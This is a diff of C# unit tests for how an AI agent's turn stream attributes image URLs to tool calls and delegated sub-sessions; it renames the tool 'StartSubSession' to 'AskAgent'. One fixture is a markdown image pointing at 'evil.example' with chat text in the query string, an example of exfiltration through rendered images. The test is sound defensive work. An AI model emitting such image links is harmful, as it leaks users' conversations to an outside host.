@@ -37,7 +37,7 @@ public class TurnStreamImageTests
     public void ASubSessionsToolResult_GivesTheUrlToItsOwnTurnsBlock()
     {
         var turn = Apply(
-            ToolUse("d1", "StartSubSession"),
+            ToolUse("d1", "AskAgent"),
             InSubSession("d1", ToolUse("c1", "FetchUrl")),
             InSubSession("d1", ToolResult("c1", Page)));
 
@@ -62,6 +62,6 @@ public class TurnStreamImageTests
     [Test]
     public void TheResultOfADelegationCall_GivesNone_BecauseItIsTheSpecialistsAnswerNotWhatAToolRead() =>
         Assert.That(
-            Apply(ToolUse("d1", "StartSubSession"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)"))
+            Apply(ToolUse("d1", "AskAgent"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)"))
                 .Blocks[0].Images, Is.Empty);
 }
